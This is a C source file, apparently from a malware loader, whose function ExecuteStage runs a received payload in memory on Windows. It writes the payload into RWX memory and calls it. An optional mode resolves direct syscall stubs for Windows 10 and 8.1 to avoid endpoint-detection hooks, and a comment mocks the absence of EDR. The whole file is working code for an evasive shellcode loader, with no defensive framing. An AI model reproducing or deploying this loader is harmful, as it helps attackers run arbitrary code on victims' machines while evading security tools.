#include <stdio.h>
#include <windows.h>

#include "loader.h"
#include "syscalls.h"

VOID ExecuteStage(CHAR* Stage, DWORD sSize)
{
    // execute the stage

    // if we are not running in secure mode then use winapi calls.
    // not caring about creating a new PAGE_EXECUTE_READWRITE cause theres no EDR right?
    #ifndef SECURE
        void* module = VirtualAlloc(0, sSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(module, Stage, sSize);
        ((void(*)())module)();
        return;
    #endif

    DWORD status;
    ULONG OldPro;
    LPVOID pBuffer = NULL;
    SIZE_T uSize = (SIZE_T)sSize;

    OSVERSIONINFOEXW osInfo;
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    // resolve so we can use this later to identify what syscall we need
    RtlGetVersion_ RtlGetVersion = (RtlGetVersion_)GetProcAddress(LoadLibrary("ntdll.dll"), "RtlGetVersion");

    RtlGetVersion(&osInfo);

    if ((osInfo.dwMajorVersion) == 10 && (osInfo.dwMinorVersion == 0))
    {
        NtAllocateVirtualMemory = &NtAllocateVirtualMemory10;
        NtProtectVirtualMemory  = &NtProtectVirtualMemory10;
    } 
    else if ((osInfo.dwMajorVersion) == 6 && (osInfo.dwMinorVersion == 3))
    {
        NtAllocateVirtualMemory = &NtAllocateVirtualMemory81;
        NtProtectVirtualMemory  = &NtProtectVirtualMemory81;
    }
    
    status = NtAllocateVirtualMemory(GetCurrentProcess(), &pBuffer, 0, &uSize, MEM_COMMIT, PAGE_READWRITE);
    if (status != 0)
    {
        DEBUG("Failed to NtAllocateVirtualMemory");
        return;
    }

    status = NtProtectVirtualMemory(GetCurrentProcess(), &pBuffer, &uSize, PAGE_EXECUTE_READWRITE, &OldPro);
    if (status != 0) 
    {
        DEBUG("Failed to NtProtectVirtualMemory10");
        return;
    }

    memcpy(pBuffer, Stage, sSize);

    ((void(*)())pBuffer)();

    return;
}